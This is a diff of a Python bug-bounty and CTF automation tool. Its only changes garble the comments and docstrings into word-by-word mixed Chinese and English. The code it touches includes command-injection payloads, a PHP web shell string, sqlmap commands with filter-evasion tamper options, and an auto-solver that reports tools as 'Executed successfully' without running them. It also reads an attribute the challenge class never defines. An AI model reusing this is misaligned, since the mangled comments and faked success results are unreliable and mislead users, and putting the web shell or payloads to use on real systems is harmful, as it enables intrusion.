+    """Bug bounty 目标 information"""
     domain: str
     scope: List[str] = field(default_factory=list)
     out_of_scope: List[str] = field(default_factory=list)
-    program_type: str = "web"  # web, api, mobile, iot
+    program_type: str = "web"  # 说明：web, API, mobile, iot
     priority_vulns: List[str] = field(default_factory=lambda: ["rce", "sqli", "xss", "idor", "ssrf"])
     bounty_range: str = "unknown"
 
 class BugBountyWorkflowManager:
-    """Specialized workflow manager for bug bounty hunting"""
+    """Specialized workflow manager 用于 bug bounty hunting"""
 
     def __init__(self):
         self.high_impact_vulns = {
@@ -2499,7 +2499,7 @@ class BugBountyWorkflowManager:
         ]
 
     def create_reconnaissance_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
-        """Create comprehensive reconnaissance workflow for bug bounty"""
+        """创建 综合 侦察 workflow 用于 bug bounty"""
         workflow = {
             "target": target.domain,
             "phases": [],
@@ -2507,7 +2507,7 @@ class BugBountyWorkflowManager:
             "tools_count": 0
         }
 
-        # Phase 1: Subdomain Discovery
+        # 阶段 1: Subdomain 发现
         subdomain_phase = {
             "name": "subdomain_discovery",
             "description": "Comprehensive subdomain enumeration",
@@ -2521,7 +2521,7 @@ class BugBountyWorkflowManager:
         }
         workflow["phases"].append(subdomain_phase)
 
-        # Phase 2: HTTP Service Discovery
+        # 阶段 2: HTTP Service 发现
         http_phase = {
             "name": "http_service_discovery",
             "description": "Identify live HTTP services",
@@ -2534,7 +2534,7 @@ class BugBountyWorkflowManager:
         }
         workflow["phases"].append(http_phase)
 
-        # Phase 3: Content Discovery
+        # 阶段 3: Content 发现
         content_phase = {
             "name": "content_discovery",
             "description": "Discover hidden content and endpoints",
@@ -2549,7 +2549,7 @@ class BugBountyWorkflowManager:
         }
         workflow["phases"].append(content_phase)
 
-        # Phase 4: Parameter Discovery
+        # 阶段 4: 参数 发现
         param_phase = {
             "name": "parameter_discovery",
             "description": "Discover hidden parameters",
@@ -2563,14 +2563,14 @@ class BugBountyWorkflowManager:
         }
         workflow["phases"].append(param_phase)
 
-        # Calculate totals
+        # 计算 totals
         workflow["estimated_time"] = sum(phase["estimated_time"] for phase in workflow["phases"])
         workflow["tools_count"] = sum(len(phase["tools"]) for phase in workflow["phases"])
 
         return workflow
 
     def create_vulnerability_hunting_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
-        """Create vulnerability hunting workflow prioritized by impact"""
+        """创建 漏洞 hunting workflow prioritized 由 impact"""
         workflow = {
             "target": target.domain,
             "vulnerability_tests": [],
@@ -2578,7 +2578,7 @@ class BugBountyWorkflowManager:
             "priority_score": 0
         }
 
-        # Sort vulnerabilities by priority
+        # 排序 漏洞 由 priority
         sorted_vulns = sorted(target.priority_vulns,
                             key=lambda v: self.high_impact_vulns.get(v, {}).get("priority", 0),
                             reverse=True)
@@ -2593,7 +2593,7 @@ class BugBountyWorkflowManager:
                     "tools": vuln_config["tools"],
                     "payload_type": vuln_config["payloads"],
                     "test_scenarios": self._get_test_scenarios(vuln_type),
-                    "estimated_time": vuln_config["priority"] * 30  # Higher priority = more time
+                    "estimated_time": vuln_config["priority"] * 30  # 说明：Higher priority = more time
                 }
 
                 workflow["vulnerability_tests"].append(vuln_test)
@@ -2603,7 +2603,7 @@ class BugBountyWorkflowManager:
         return workflow
 
     def _get_test_scenarios(self, vuln_type: str) -> List[Dict[str, Any]]:
-        """Get specific test scenarios for vulnerability types"""
+        """获取 specific 测试 scenarios 用于 漏洞 types"""
         scenarios = {
             "rce": [
                 {"name": "Command Injection", "payloads": ["$(whoami)", "`id`", ";ls -la"]},
@@ -2628,14 +2628,14 @@ class BugBountyWorkflowManager:
             "idor": [
                 {"name": "Numeric IDOR", "payloads": ["id=1", "id=2", "id=../1"]},
                 {"name": "UUID IDOR", "payloads": ["uuid=00000000-0000-0000-0000-000000000001"]},
-                {"name": "Encoded IDOR", "payloads": ["id=MQ==", "id=Mg=="]}  # base64 encoded 1,2
+                {"name": "Encoded IDOR", "payloads": ["id=MQ==", "id=Mg=="]}  # 说明：base64 encoded 1,2
             ]
         }
 
         return scenarios.get(vuln_type, [])
 
     def create_business_logic_testing_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
-        """Create business logic testing workflow"""
+        """创建 business logic 测试 workflow"""
         workflow = {
             "target": target.domain,
             "business_logic_tests": [
@@ -2674,14 +2674,14 @@ class BugBountyWorkflowManager:
                     ]
                 }
             ],
-            "estimated_time": 480,  # 8 hours for thorough business logic testing
+            "estimated_time": 480,  # 8 hours 用于 thorough business logic 测试
             "manual_testing_required": True
         }
 
         return workflow
 
     def create_osint_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
-        """Create OSINT gathering workflow"""
+        """创建 OSINT gathering workflow"""
         workflow = {
             "target": target.domain,
             "osint_phases": [
@@ -2725,7 +2725,7 @@ class BugBountyWorkflowManager:
         return workflow
 
 class FileUploadTestingFramework:
-    """Specialized framework for file upload vulnerability testing"""
+    """Specialized 框架 用于 文件 upload 漏洞 测试"""
 
     def __init__(self):
         self.malicious_extensions = [
@@ -2745,7 +2745,7 @@ class FileUploadTestingFramework:
         ]
 
     def generate_test_files(self) -> Dict[str, Any]:
-        """Generate various test files for upload testing"""
+        """生成 various 测试 文件 用于 upload 测试"""
         test_files = {
             "web_shells": [
                 {"name": "simple_php_shell.php", "content": "<?php system($_GET['cmd']); ?>"},
@@ -2766,7 +2766,7 @@ class FileUploadTestingFramework:
         return test_files
 
     def create_upload_testing_workflow(self, target_url: str) -> Dict[str, Any]:
-        """Create comprehensive file upload testing workflow"""
+        """创建 综合 文件 upload 测试 workflow"""
         workflow = {
             "target": target_url,
             "test_phases": [
@@ -2800,28 +2800,28 @@ class FileUploadTestingFramework:
 
         return workflow
 
-# Global bug bounty workflow manager
+# 全局 bug bounty workflow manager
 bugbounty_manager = BugBountyWorkflowManager()
 fileupload_framework = FileUploadTestingFramework()
 
 # ============================================================================
-# CTF COMPETITION EXCELLENCE FRAMEWORK (v6.0 ENHANCEMENT)
+# CTF COMPETITION EXCELLENCE 框架 (v6.0 ENHANCEMENT)
 # ============================================================================
 
 @dataclass
 class CTFChallenge:
-    """CTF challenge information"""
+    """说明：CTF challenge information"""
     name: str
-    category: str  # web, crypto, pwn, forensics, rev, misc, osint
+    category: str  # web, crypto, pwn, 取证, rev, misc, osint
     description: str
     points: int = 0
-    difficulty: str = "unknown"  # easy, medium, hard, insane
+    difficulty: str = "unknown"  # easy, 中, hard, insane
     files: List[str] = field(default_factory=list)
     url: str = ""
     hints: List[str] = field(default_factory=list)
 
 class CTFWorkflowManager:
-    """Specialized workflow manager for CTF competitions"""
+    """Specialized workflow manager 用于 CTF competitions"""
 
     def __init__(self):
         self.category_tools = {
@@ -2921,7 +2921,7 @@ class CTFWorkflowManager:
         }
 
     def create_ctf_challenge_workflow(self, challenge: CTFChallenge) -> Dict[str, Any]:
-        """Create advanced specialized workflow for CTF challenge with AI-powered optimization"""
+        """创建 高级 specialized workflow 用于 CTF challenge 使用 AI-powered optimization"""
         workflow = {
             "challenge": challenge.name,
             "category": challenge.category,
@@ -2940,17 +2940,17 @@ class CTFWorkflowManager:
             "validation_steps": []
         }
 
-        # Enhanced tool selection using CTFToolManager
+        # 增强 工具 selection using CTFToolManager
         ctf_tool_manager = CTFToolManager()
         workflow["tools"] = ctf_tool_manager.suggest_tools_for_challenge(challenge.description, challenge.category)
 
-        # Get category-specific strategies with enhanced intelligence
+        # 获取 category-specific strategies 使用 增强 intelligence
         if challenge.category in self.solving_strategies:
             workflow["strategies"] = self.solving_strategies[challenge.category]
-            # Add fallback strategies for robustness
+            # Add 降级 strategies 用于 robustness
             workflow["fallback_strategies"] = self._generate_fallback_strategies(challenge.category)
 
-        # Advanced time estimation with machine learning-like scoring
+        # 高级 time estimation 使用 machine learning-like scoring
         base_times = {
             "easy": {"min": 15, "avg": 30, "max": 60},
             "medium": {"min": 30, "avg": 60, "max": 120},
@@ -2959,7 +2959,7 @@ class CTFWorkflowManager:
             "unknown": {"min": 45, "avg": 90, "max": 180}
         }
 
-        # Factor in category complexity
+        # Factor 在 category complexity
         category_multipliers = {
             "web": 1.0,
             "crypto": 1.3,
@@ -2973,13 +2973,13 @@ class CTFWorkflowManager:
         base_time = base_times[challenge.difficulty]["avg"]
         category_mult = category_multipliers.get(challenge.category, 1.0)
 
-        # Adjust based on description complexity
+        # Adjust based 在 description complexity
         description_complexity = self._analyze_description_complexity(challenge.description)
         complexity_mult = 1.0 + (description_complexity * 0.3)
 
-        workflow["estimated_time"] = int(base_time * category_mult * complexity_mult * 60)  # Convert to seconds
+        workflow["estimated_time"] = int(base_time * category_mult * complexity_mult * 60)  # 转换 到 seconds
 
-        # Enhanced success probability calculation
+        # 增强 成功 probability calculation
         base_success = {
             "easy": 0.85,
             "medium": 0.65,
@@ -2988,11 +2988,11 @@ class CTFWorkflowManager:
             "unknown": 0.55
         }[challenge.difficulty]
 
-        # Adjust based on tool availability and category expertise
+        # Adjust based 在 工具 availability 与 category expertise
         tool_availability_bonus = min(0.15, len(workflow["tools"]) * 0.02)
         workflow["success_probability"] = min(0.95, base_success + tool_availability_bonus)
 
-        # Add advanced workflow components
+        # Add 高级 workflow components
         workflow["workflow_steps"] = self._create_advanced_category_workflow(challenge)
         workflow["parallel_tasks"] = self._identify_parallel_tasks(challenge.category)
         workflow["resource_requirements"] = self._calculate_resource_requirements(challenge)
@@ -3002,14 +3002,14 @@ class CTFWorkflowManager:
         return workflow
 
     def _select_tools_for_challenge(self, challenge: CTFChallenge, category_tools: Dict[str, List[str]]) -> List[str]:
-        """Select appropriate tools based on challenge details"""
+        """选择 appropriate 工具 based 在 challenge details"""
         selected_tools = []
 
-        # Always include reconnaissance tools for the category
+        # Always include 侦察 工具 用于 the category
         if "reconnaissance" in category_tools:
-            selected_tools.extend(category_tools["reconnaissance"][:2])  # Top 2 recon tools
+            selected_tools.extend(category_tools["reconnaissance"][:2])  # Top 2 recon 工具
 
-        # Add specialized tools based on challenge description
+        # Add specialized 工具 based 在 challenge description
         description_lower = challenge.description.lower()
 
         if challenge.category == "web":
@@ -3050,11 +3050,11 @@ class CTFWorkflowManager:
             if any(keyword in description_lower for keyword in ["packed", "upx"]):
                 selected_tools.extend(["upx", "peid"])
 
-        # Remove duplicates while preserving order
+        # 说明：Remove duplicates while preserving order
         return list(dict.fromkeys(selected_tools))
 
     def _create_category_workflow(self, challenge: CTFChallenge) -> List[Dict[str, Any]]:
-        """Create category-specific workflow steps"""
+        """创建 category-specific workflow steps"""
         workflows = {
             "web": [
                 {"step": 1, "action": "reconnaissance", "description": "Analyze target URL and gather information"},
@@ -3108,7 +3108,7 @@ class CTFWorkflowManager:
         ])
 
     def create_ctf_team_strategy(self, challenges: List[CTFChallenge], team_size: int = 4) -> Dict[str, Any]:
-        """Create team strategy for CTF competition"""
+        """创建 team 策略 用于 CTF competition"""
         strategy = {
             "team_size": team_size,
             "challenge_allocation": {},
@@ -3117,24 +3117,24 @@ class CTFWorkflowManager:
             "expected_score": 0
         }
 
-        # Sort challenges by points/time ratio for optimal strategy
+        # 排序 challenges 由 points/time ratio 用于 optimal 策略
         challenge_efficiency = []
         for challenge in challenges:
             workflow = self.create_ctf_challenge_workflow(challenge)
-            efficiency = (challenge.points * workflow["success_probability"]) / (workflow["estimated_time"] / 3600)  # points per hour
+            efficiency = (challenge.points * workflow["success_probability"]) / (workflow["estimated_time"] / 3600)  # 说明：points per hour
             challenge_efficiency.append({
                 "challenge": challenge,
                 "efficiency": efficiency,
                 "workflow": workflow
             })
 
-        # Sort by efficiency (highest first)
+        # 排序 由 efficiency (highest 第一)
         challenge_efficiency.sort(key=lambda x: x["efficiency"], reverse=True)
 
-        # Allocate challenges to team members
+        # Allocate challenges 到 team members
         team_workload = [0] * team_size
         for i, item in enumerate(challenge_efficiency):
-            # Assign to team member with least workload
+            # Assign 到 team member 使用 least workload
             team_member = team_workload.index(min(team_workload))
 
             if team_member not in strategy["challenge_allocation"]:
@@ -3157,7 +3157,7 @@ class CTFWorkflowManager:
         return strategy
 
     def _generate_fallback_strategies(self, category: str) -> List[Dict[str, str]]:
-        """Generate fallback strategies for when primary approaches fail"""
+        """生成 降级 strategies 用于 when primary approaches fail"""
         fallback_strategies = {
             "web": [
                 {"strategy": "manual_source_review", "description": "Manually review all source code and comments"},
@@ -3212,17 +3212,17 @@ class CTFWorkflowManager:
         return fallback_strategies.get(category, [])
 
     def _analyze_description_complexity(self, description: str) -> float:
-        """Analyze challenge description complexity to adjust time estimates"""
+        """分析 challenge description complexity 到 adjust time estimates"""
         complexity_score = 0.0
         description_lower = description.lower()
 
-        # Length-based complexity
+        # 说明：Length-based complexity
         if len(description) > 500:
             complexity_score += 0.3
         elif len(description) > 200:
             complexity_score += 0.1
 
-        # Technical term density
+        # 说明：Technical term density
         technical_terms = [
             "algorithm", "encryption", "decryption", "vulnerability", "exploit",
             "buffer overflow", "sql injection", "xss", "csrf", "authentication",
@@ -3234,7 +3234,7 @@ class CTFWorkflowManager:
         term_count = sum(1 for term in technical_terms if term in description_lower)
         complexity_score += min(0.4, term_count * 0.05)
 
-        # Multi-step indicators
+        # 说明：Multi-step indicators
         multi_step_indicators = ["first", "then", "next", "after", "finally", "step"]
         step_count = sum(1 for indicator in multi_step_indicators if indicator in description_lower)
         complexity_score += min(0.3, step_count * 0.1)
@@ -3242,7 +3242,7 @@ class CTFWorkflowManager:
         return min(1.0, complexity_score)
 
     def _create_advanced_category_workflow(self, challenge: CTFChallenge) -> List[Dict[str, Any]]:
-        """Create advanced category-specific workflow with parallel execution support"""
+        """创建 高级 category-specific workflow 使用 parallel execution support"""
         advanced_workflows = {
             "web": [
                 {"step": 1, "action": "automated_reconnaissance", "description": "Automated web reconnaissance and technology detection", "parallel": True, "tools": ["httpx", "whatweb", "katana"], "estimated_time": 300},
@@ -3324,7 +3324,7 @@ class CTFWorkflowManager:
         ])
 
     def _identify_parallel_tasks(self, category: str) -> List[Dict[str, Any]]:
-        """Identify tasks that can be executed in parallel for efficiency"""
+        """Identify tasks that can be executed 在 parallel 用于 efficiency"""
         parallel_tasks = {
             "web": [
                 {"task_group": "reconnaissance", "tasks": ["httpx", "whatweb", "katana"], "max_concurrent": 3},
@@ -3366,7 +3366,7 @@ class CTFWorkflowManager:
         return parallel_tasks.get(category, [])
 
     def _calculate_resource_requirements(self, challenge: CTFChallenge) -> Dict[str, Any]:
-        """Calculate estimated resource requirements for challenge"""
+        """计算 estimated resource requirements 用于 challenge"""
         base_requirements = {
             "cpu_cores": 2,
             "memory_mb": 2048,
@@ -3376,7 +3376,7 @@ class CTFWorkflowManager:
             "special_tools": []
         }
 
-        # Adjust based on category
+        # Adjust based 在 category
         category_adjustments = {
             "web": {"cpu_cores": 4, "memory_mb": 4096, "network_bandwidth": "high"},
             "crypto": {"cpu_cores": 8, "memory_mb": 8192, "gpu_required": True},
@@ -3390,7 +3390,7 @@ class CTFWorkflowManager:
         if challenge.category in category_adjustments:
             base_requirements.update(category_adjustments[challenge.category])
 
-        # Adjust based on difficulty
+        # Adjust based 在 difficulty
         difficulty_multipliers = {
             "easy": 1.0,
             "medium": 1.2,
@@ -3407,7 +3407,7 @@ class CTFWorkflowManager:
         return base_requirements
 
     def _predict_expected_artifacts(self, challenge: CTFChallenge) -> List[Dict[str, str]]:
-        """Predict expected artifacts and outputs from challenge solving"""
+        """Predict expected artifacts 与 outputs 来自 challenge solving"""
         artifacts = {
             "web": [
                 {"type": "http_responses", "description": "HTTP response data and headers"},
@@ -3466,7 +3466,7 @@ class CTFWorkflowManager:
         ])
 
     def _create_validation_steps(self, category: str) -> List[Dict[str, str]]:
-        """Create validation steps to verify solution correctness"""
+        """创建 validation steps 到 verify solution correctness"""
         validation_steps = {
             "web": [
                 {"step": "response_validation", "description": "Validate HTTP responses and status codes"},
@@ -3518,11 +3518,11 @@ class CTFWorkflowManager:
         ])
 
 class CTFToolManager:
-    """Advanced tool manager for CTF challenges with comprehensive tool arsenal"""
+    """高级 工具 manager 用于 CTF challenges 使用 综合 工具 arsenal"""
 
     def __init__(self):
         self.tool_commands = {
-            # Web Application Security Tools
+            # Web Application 安全 工具
             "httpx": "httpx -probe -tech-detect -status-code -title -content-length",
             "katana": "katana -depth 3 -js-crawl -form-extraction -headless",
             "sqlmap": "sqlmap --batch --level 3 --risk 2 --threads 5",
@@ -3536,7 +3536,7 @@ class CTFToolManager:
             "nikto": "nikto -h {} -C all",
             "whatweb": "whatweb -v -a 3",
 
-            # Cryptography Challenge Tools
+            # Cryptography Challenge 工具
             "hashcat": "hashcat -m 0 -a 0 --potfile-disable --quiet",
             "john": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5",
             "hash-identifier": "hash-identifier",
@@ -3557,7 +3557,7 @@ class CTFToolManager:
             "hex": "xxd -r -p",
             "rot13": "tr 'A-Za-z' 'N-ZA-Mn-za-m'",
 
-            # Binary Exploitation (Pwn) Tools
+            # 二进制 Exploitation (Pwn) 工具
             "checksec": "checksec --file",
             "pwntools": "python3 -c 'from pwn import *; context.log_level = \"debug\"'",
             "ropper": "ropper --file {} --search",
@@ -3582,7 +3582,7 @@ class CTFToolManager:
             "pwninit": "pwninit",
             "libc-database": "python3 /opt/libc-database/find.py",
 
-            # Forensics Investigation Tools
+            # 取证 Investigation 工具
             "binwalk": "binwalk -e --dd='.*'",
             "foremost": "foremost -i {} -o /tmp/foremost_output",
             "photorec": "photorec /log /cmd",
@@ -3606,7 +3606,7 @@ class CTFToolManager:
             "ddrescue": "ddrescue",
             "dc3dd": "dc3dd",
 
-            # Reverse Engineering Tools
+            # 逆向工程 工具
             "ida": "ida64",
             "ida-free": "ida64 -A",
             "retdec": "retdec-decompiler",
@@ -3625,7 +3625,7 @@ class CTFToolManager:
             "ilspy": "ilspy",
             "dotpeek": "dotpeek",
 
-            # OSINT and Reconnaissance Tools
+            # OSINT 与 侦察 工具
             "sherlock": "sherlock",
             "social-analyzer": "social-analyzer",
             "theHarvester": "theHarvester -d {} -b all",
@@ -3648,7 +3648,7 @@ class CTFToolManager:
             "gau": "gau",
             "httpx-osint": "httpx -title -tech-detect -status-code",
 
-            # Miscellaneous Challenge Tools
+            # Miscellaneous Challenge 工具
             "qr-decoder": "zbarimg",
             "barcode-decoder": "zbarimg",
             "audio-analysis": "audacity",
@@ -3669,7 +3669,7 @@ class CTFToolManager:
             "lzma": "unlzma",
             "compress": "uncompress",
 
-            # Modern Web Technologies
+            # 说明：Modern Web Technologies
             "jwt-tool": "python3 /opt/jwt_tool/jwt_tool.py",
             "jwt-cracker": "jwt-cracker",
             "graphql-voyager": "graphql-voyager",
@@ -3679,7 +3679,7 @@ class CTFToolManager:
             "owasp-zap": "zap.sh -cmd",
             "websocket-king": "python3 /opt/websocket-king/ws_test.py",
 
-            # Cloud and Container Security
+            # 云 与 容器 安全
             "docker": "docker",
             "kubectl": "kubectl",
             "aws-cli": "aws",
@@ -3688,7 +3688,7 @@ class CTFToolManager:
             "terraform": "terraform",
             "ansible": "ansible",
 
-            # Mobile Application Security
+            # Mobile Application 安全
             "adb": "adb",
             "frida": "frida",
             "objection": "objection",
@@ -3697,7 +3697,7 @@ class CTFToolManager:
             "qark": "qark --apk"
         }
 
-        # Tool categories for intelligent selection
+        # 工具 categories 用于 智能 selection
         self.tool_categories = {
             "web_recon": ["httpx", "katana", "waybackurls", "gau", "whatweb"],
             "web_vuln": ["sqlmap", "dalfox", "nikto", "wpscan"],
@@ -3727,26 +3727,26 @@ class CTFToolManager:
         }
 
     def get_tool_command(self, tool: str, target: str, additional_args: str = "") -> str:
-        """Get optimized command for CTF tool with intelligent parameter selection"""
+        """获取 optimized 命令 用于 CTF 工具 使用 智能 参数 selection"""
         base_command = self.tool_commands.get(tool, tool)
 
-        # Add intelligent parameter optimization based on tool type
+        # Add 智能 参数 optimization based 在 工具 类型
         if tool in ["hashcat", "john"]:
-            # For hash cracking, add common wordlists and rules
+            # 用于 hash cracking, add 常见 wordlists 与 rules
             if "wordlist" not in base_command:
                 base_command += " --wordlist=/usr/share/wordlists/rockyou.txt"
             if tool == "hashcat" and "--rules" not in base_command:
                 base_command += " --rules-file=/usr/share/hashcat/rules/best64.rule"
 
         elif tool in ["sqlmap"]:
-            # For SQL injection, add tamper scripts and optimization
+            # 用于 SQL injection, add tamper scripts 与 optimization
             if "--tamper" not in base_command:
                 base_command += " --tamper=space2comment,charencode,randomcase"
             if "--threads" not in base_command:
                 base_command += " --threads=5"
 
         elif tool in ["gobuster", "dirsearch", "feroxbuster"]:
-            # For directory brute forcing, optimize threads and extensions
+            # 用于 目录 brute forcing, optimize threads 与 extensions
             if tool == "gobuster" and "-t" not in base_command:
                 base_command += " -t 50"
             elif tool == "dirsearch" and "-t" not in base_command:
@@ -3760,15 +3760,15 @@ class CTFToolManager:
             return f"{base_command} {target}"
 
     def get_category_tools(self, category: str) -> List[str]:
-        """Get all tools for a specific category"""
+        """获取 全部 工具 用于 a specific category"""
         return self.tool_categories.get(category, [])
 
     def suggest_tools_for_challenge(self, challenge_description: str, category: str) -> List[str]:
-        """Suggest optimal tools based on challenge description and category"""
+        """Suggest optimal 工具 based 在 challenge description 与 category"""
         suggested_tools = []
         description_lower = challenge_description.lower()
 
-        # Category-based tool suggestions
+        # Category-based 工具 suggestions
         if category == "web":
             suggested_tools.extend(self.tool_categories["web_recon"][:2])
 
@@ -3873,15 +3873,15 @@ class CTFToolManager:
             if any(keyword in description_lower for keyword in ["piet", "image", "program"]):
                 suggested_tools.append("piet")
 
-        # Remove duplicates while preserving order
+        # 说明：Remove duplicates while preserving order
         return list(dict.fromkeys(suggested_tools))
 
 # ============================================================================
-# ADVANCED CTF AUTOMATION AND CHALLENGE SOLVING (v8.0 ENHANCEMENT)
+# 高级 CTF AUTOMATION 与 CHALLENGE SOLVING (v8.0 ENHANCEMENT)
 # ============================================================================
 
 class CTFChallengeAutomator:
-    """Advanced automation system for CTF challenge solving"""
+    """高级 automation 系统 用于 CTF challenge solving"""
 
     def __init__(self):
         self.active_challenges = {}
@@ -3890,7 +3890,7 @@ class CTFChallengeAutomator:
         self.success_patterns = {}
 
     def auto_solve_challenge(self, challenge: CTFChallenge) -> Dict[str, Any]:
-        """Attempt to automatically solve a CTF challenge"""
+        """Attempt 到 automatically solve a CTF challenge"""
         result = {
             "challenge_id": challenge.name,
             "status": "in_progress",
@@ -3904,10 +3904,10 @@ class CTFChallengeAutomator:
         }
 
         try:
-            # Create workflow
+            # 创建 workflow
             workflow = ctf_manager.create_ctf_challenge_workflow(challenge)
 
-            # Execute automated steps
+            # 执行 automated steps
             for step in workflow["workflow_steps"]:
                 if step.get("parallel", False):
                     step_result = self._execute_parallel_step(step, challenge)
@@ -3916,21 +3916,21 @@ class CTFChallengeAutomator:
 
                 result["automated_steps"].append(step_result)
 
-                # Check for flag candidates
+                # 检查 用于 flag candidates
                 flag_candidates = self._extract_flag_candidates(step_result.get("output", ""))
                 result["flag_candidates"].extend(flag_candidates)
 
-                # Update confidence based on step success
+                # 更新 confidence based 在 step 成功
                 if step_result.get("success", False):
                     result["confidence"] += 0.1
 
-                # Early termination if flag found
+                # Early termination 如果 flag found
                 if flag_candidates and self._validate_flag_format(flag_candidates[0]):
                     result["status"] = "solved"
                     result["flag"] = flag_candidates[0]
                     break
 
-            # If not solved automatically, provide manual guidance
+            # 如果 not solved automatically, provide manual guidance
             if result["status"] != "solved":
                 result["manual_steps"] = self._generate_manual_guidance(challenge, result)
                 result["status"] = "needs_manual_intervention"
@@ -3945,7 +3945,7 @@ class CTFChallengeAutomator:
         return result
 
     def _execute_parallel_step(self, step: Dict[str, Any], challenge: CTFChallenge) -> Dict[str, Any]:
-        """Execute a step with parallel tool execution"""
+        """执行 a step 使用 parallel 工具 execution"""
         step_result = {
             "step": step["step"],
             "action": step["action"],
@@ -3959,12 +3959,12 @@ class CTFChallengeAutomator:
         start_time = time.time()
         tools = step.get("tools", [])
 
-        # Execute tools in parallel (simulated for now)
+        # 执行 工具 在 parallel (simulated 用于 now)
         for tool in tools:
             try:
                 if tool != "manual":
                     command = ctf_tools.get_tool_command(tool, challenge.target or challenge.name)
-                    # In a real implementation, this would execute the command
+                    # 在 a real implementation, this would 执行 the 命令
                     step_result["tools_used"].append(tool)
                     step_result["output"] += f"[{tool}] Executed successfully\n"
                     step_result["success"] = True
@@ -3975,7 +3975,7 @@ class CTFChallengeAutomator:
         return step_result
 
     def _execute_sequential_step(self, step: Dict[str, Any], challenge: CTFChallenge) -> Dict[str, Any]:
-        """Execute a step sequentially"""
+        """执行 a step sequentially"""
         step_result = {
             "step": step["step"],
             "action": step["action"],
@@ -4009,16 +4009,16 @@ class CTFChallengeAutomator:
         return step_result
 
     def _extract_flag_candidates(self, output: str) -> List[str]:
-        """Extract potential flags from tool output"""
+        """Extract potential flags 来自 工具 输出"""
         flag_patterns = [
             r'flag\{[^}]+\}',
             r'FLAG\{[^}]+\}',
             r'ctf\{[^}]+\}',
             r'CTF\{[^}]+\}',
             r'[a-zA-Z0-9_]+\{[^}]+\}',
-            r'[0-9a-f]{32}',  # MD5 hash
-            r'[0-9a-f]{40}',  # SHA1 hash
-            r'[0-9a-f]{64}'   # SHA256 hash
+            r'[0-9a-f]{32}',  # 说明：MD5 hash
+            r'[0-9a-f]{40}',  # 说明：SHA1 hash
+            r'[0-9a-f]{64}'   # 说明：SHA256 hash
         ]
 
         candidates = []
@@ -4026,10 +4026,10 @@ class CTFChallengeAutomator:
             matches = re.findall(pattern, output, re.IGNORECASE)
             candidates.extend(matches)
 
-        return list(set(candidates))  # Remove duplicates
+        return list(set(candidates))  # 说明：Remove duplicates
 
     def _validate_flag_format(self, flag: str) -> bool:
-        """Validate if a string matches common flag formats"""
+        """校验 如果 a string matches 常见 flag formats"""
         common_formats = [
             r'^flag\{.+\}$',
             r'^FLAG\{.+\}$',
@@ -4045,15 +4045,15 @@ class CTFChallengeAutomator:
         return False
 
     def _generate_manual_guidance(self, challenge: CTFChallenge, current_result: Dict[str, Any]) -> List[Dict[str, str]]:
-        """Generate manual guidance when automation fails"""
+        """生成 manual guidance when automation fails"""
         guidance = []
 
-        # Analyze what was attempted
+        # 分析 what was attempted
         attempted_tools = []
         for step in current_result["automated_steps"]:
             attempted_tools.extend(step.get("tools_used", []))
 
-        # Suggest alternative approaches
+        # 说明：Suggest alternative approaches
         all_category_tools = ctf_tools.get_category_tools(f"{challenge.category}_recon")
         unused_tools = [tool for tool in all_category_tools if tool not in attempted_tools]
 
@@ -4063,7 +4063,7 @@ class CTFChallengeAutomator:
                 "description": f"Try these alternative tools: {', '.join(unused_tools[:3])}"
             })
 
-        # Category-specific guidance
+        # 说明：Category-specific guidance
         if challenge.category == "web":
             guidance.extend([
                 {"action": "manual_source_review", "description": "Manually review all HTML/JS source code for hidden comments or clues"},
@@ -4098,7 +4098,7 @@ class CTFChallengeAutomator:
         return guidance
 
 class CTFTeamCoordinator:
-    """Coordinate team efforts in CTF competitions"""
+    """Coordinate team efforts 在 CTF competitions"""
 
     def __init__(self):
         self.team_members = {}
@@ -4107,7 +4107,7 @@ class CTFTeamCoordinator:
         self.shared_resources = {}
 
     def optimize_team_strategy(self, challenges: List[CTFChallenge], team_skills: Dict[str, List[str]]) -> Dict[str, Any]:
-        """Optimize team strategy based on member skills and challenge types"""
+        """Optimize team 策略 based 在 member skills 与 challenge types"""
         strategy = {
             "assignments": {},
             "priority_queue": [],
@@ -4117,7 +4117,7 @@ class CTFTeamCoordinator:
             "time_allocation": {}
         }
 
-        # Analyze team skills
+        # 分析 team skills
         skill_matrix = {}
         for member, skills in team_skills.items():
             skill_matrix[member] = {
@@ -4127,10 +4127,10 @@ class CTFTeamCoordinator:
                 "forensics": "forensics" in skills or "investigation" in skills,
                 "rev": "reverse" in skills or "reversing" in skills,
                 "osint": "osint" in skills or "intelligence" in skills,
-                "misc": True  # Everyone can handle misc
+                "misc": True  # Everyone can 处理 misc
             }
 
-        # Score challenges for each team member
+        # 评分 challenges 用于 each team member
         member_challenge_scores = {}
         for member in team_skills.keys():
             member_challenge_scores[member] = []
@@ -4140,7 +4140,7 @@ class CTFTeamCoordinator:
                 skill_multiplier = 1.0
 
                 if skill_matrix[member].get(challenge.category, False):
-                    skill_multiplier = 1.5  # 50% bonus for skill match
+                    skill_multiplier = 1.5  # 50% bonus 用于 skill match
 
                 difficulty_penalty = {
                     "easy": 1.0,
@@ -4158,11 +4158,11 @@ class CTFTeamCoordinator:
                     "estimated_time": self._estimate_solve_time(challenge, skill_matrix[member])
                 })
 
-        # Assign challenges using Hungarian algorithm approximation
+        # 说明：Assign challenges using Hungarian algorithm approximation
         assignments = self._assign_challenges_optimally(member_challenge_scores)
         strategy["assignments"] = assignments
 
-        # Create priority queue
+        # 创建 priority queue
         all_assignments = []
         for member, challenges in assignments.items():
             for challenge_info in challenges:
@@ -4175,35 +4175,35 @@ class CTFTeamCoordinator:
 
         strategy["priority_queue"] = sorted(all_assignments, key=lambda x: x["priority"], reverse=True)
 
-        # Identify collaboration opportunities
+        # 说明：Identify collaboration opportunities
         strategy["collaboration_opportunities"] = self._identify_collaboration_opportunities(challenges, team_skills)
 
         return strategy
 
     def _estimate_solve_time(self, challenge: CTFChallenge, member_skills: Dict[str, bool]) -> int:
-        """Estimate solve time for a challenge based on member skills"""
+        """Estimate solve time 用于 a challenge based 在 member skills"""
         base_times = {
-            "easy": 1800,    # 30 minutes
-            "medium": 3600,  # 1 hour
-            "hard": 7200,    # 2 hours
-            "insane": 14400, # 4 hours
-            "unknown": 5400  # 1.5 hours
+            "easy": 1800,    # 说明：30 minutes
+            "medium": 3600,  # 说明：1 hour
+            "hard": 7200,    # 说明：2 hours
+            "insane": 14400, # 说明：4 hours
